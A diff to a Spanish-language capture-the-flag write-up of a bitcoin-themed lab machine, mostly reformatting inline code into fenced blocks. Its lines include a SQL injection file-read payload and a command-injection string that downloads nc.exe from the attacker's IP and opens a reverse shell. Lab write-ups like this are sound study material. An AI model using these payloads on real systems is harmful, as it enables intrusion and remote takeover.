@@ -83,7 +83,11 @@ Aqui no vemos ningun dominio o cosa interesante.
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.154`, Vemos una pagina que habla de bitcoin y nos permite loggear o registrar. Empezamos por crear una cuenta
+Si entramos en la url 
+```bash
+ http://10.10.10.154 
+```
+, Vemos una pagina que habla de bitcoin y nos permite loggear o registrar. Empezamos por crear una cuenta
 y nos loggeamos.
 
 Aqui vemos que podemos transferir E-coin a alguien. Le ponemos
@@ -94,7 +98,11 @@ ID of Addressee: 1
 Comment to him/her: EEEEEEEEEE
 ```
 
-Si transferimos, aparece una popup que nos dice que `Transfer on hold. An admin will review it within a minute.`
+Si transferimos, aparece una popup que nos dice que 
+```bash
+ Transfer on hold. An admin will review it within a minute. 
+```
+
 
 
 
@@ -105,7 +113,15 @@ Si transferimos, aparece una popup que nos dice que `Transfer on hold. An admin 
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.34/FUZZ
 ```
 
-Vemos un directorio `/jailuser` que lista un directorio `dev` que contiene ficheros. Nos descargamos estos ficheros.
+Vemos un directorio 
+```bash
+ /jailuser 
+```
+ que lista un directorio 
+```bash
+ dev 
+```
+ que contiene ficheros. Nos descargamos estos ficheros.
 
 
 ## Vulnerability Assessment {-}
@@ -205,7 +221,11 @@ La idea aqui seria robar la cookie de session del administrador.
 1. Nos conectamos a la web como el usuario admin.
 
 Hay un link user.txt que nos muestra un mensaje TODO que seria de mover todos los ficheros al Default Xampp folder.
-Buscando por internet vemos que este directorio seria `C:\xampp\htdocs`.
+Buscando por internet vemos que este directorio seria 
+```bash
+ C:\xampp\htdocs 
+```
+.
 
 En la pagina principal, vemos un panel de administracion. Aqui vemos 2 cosas,
 
@@ -213,7 +233,15 @@ En la pagina principal, vemos un panel de administracion. Aqui vemos 2 cosas,
 - Un campo Search users que es en beta. Nos permite buscar usuarios por su ID
 
 El campo para ejecutar comandos no funcciona porque tendriamos que estar loggeado desde la maquina victima atacando este servicio por localhost.
-Ademas con Burpsuite, vemos que esta utilidad lanza una peticion a `/admin/backdoorchecker.php` con un parametro `cmd=...`
+Ademas con Burpsuite, vemos que esta utilidad lanza una peticion a 
+```bash
+ /admin/backdoorchecker.php 
+```
+ con un parametro 
+```bash
+ cmd=... 
+```
+
 
 Como no podemos hacer gran cosa por el momento, analyzamos el campo de busqueda de usuarios.
 
@@ -317,13 +345,25 @@ Seguimos la guia normal de un SQLI
     1' union select 1,load_file("C:\\Windows\\System32\\drivers\\etc\\hosts"),3-- -
     ```
 
-    El fichero `\etc\hosts` no nos interesa en este caso pero hemos podido comprobar si podiamos leer ficheros.
+    El fichero 
+```bash
+ \etc\hosts 
+```
+ no nos interesa en este caso pero hemos podido comprobar si podiamos leer ficheros.
 
 
-    miramos por el fichero `C:\\xampp\\htdocs\\admin\\backdoorchecker.php` y podemos ver la manera de ejecutar comandos bypasseando los badchars.
+    miramos por el fichero 
+```bash
+ C:\\xampp\\htdocs\\admin\\backdoorchecker.php 
+```
+ y podemos ver la manera de ejecutar comandos bypasseando los badchars.
 
 
-La idea aqui seria de ejecutar un comando de typo `cmd=dir|powershell -c "iwr -uri http://10.10.17.51/nc.exe -Outfile %temp%\\nc.exe";%temp%\\nc.exe -e cmd 10.10.17.51 443`.
+La idea aqui seria de ejecutar un comando de typo 
+```bash
+ cmd=dir|powershell -c "iwr -uri http://10.10.17.51/nc.exe -Outfile %temp%\\nc.exe";%temp%\\nc.exe -e cmd 10.10.17.51 443 
+```
+.
 El problema aqui sigue siendo el echo de no poder lanzar este comando porque no estamos lanzando esta peticion desde el localhost de la maquina victima.
 
 
@@ -393,7 +433,11 @@ cd C:\
 netstat -nat
 ```
 
-Aqui vemos un ejecutable llamado `bankv2.exe`. En este caso no lo vamos a analyzar. El **netstat** nos muestra un puerto **910** que no hemos visto
+Aqui vemos un ejecutable llamado 
+```bash
+ bankv2.exe 
+```
+. En este caso no lo vamos a analyzar. El **netstat** nos muestra un puerto **910** que no hemos visto
 con nmap.
 
 ```bash
@@ -401,7 +445,15 @@ netstat -ano
 tasklist
 ```
 
-El comando `netstat -ano` nos permite ver el UID de los puertos abiertos y con el comando `tasklist`, miramos que servicio core para este UID.
+El comando 
+```bash
+ netstat -ano 
+```
+ nos permite ver el UID de los puertos abiertos y con el comando 
+```bash
+ tasklist 
+```
+, miramos que servicio core para este UID.
 En este caso vemos que es el mismo **bankv2.exe**.
 
 Miramos con el **nc.exe** lo que es.
@@ -463,7 +515,11 @@ Ya podemos crear un script en python para que ataque este puerto. Pero primero c
 crunch 4 4 -t %%%% > pins.txt
 ```
 
-Creamos el `exploit.py`
+Creamos el 
+```bash
+ exploit.py 
+```
+
 
 ```python
 #!/usr/bin/python3
@@ -579,4 +635,8 @@ enviar los e-coins.
     [$] Executing e-coin transfer tool: C:\Users\Cortin\AppData\Local\Temp\nc.exe -e cmd 10.10.17.51 443
     ```
 
-Ya vemos que hemos ganado acceso al systema como `nt authority\system` y podemos ver la flag.
+Ya vemos que hemos ganado acceso al systema como 
+```bash
+ nt authority\system 
+```
+ y podemos ver la flag.
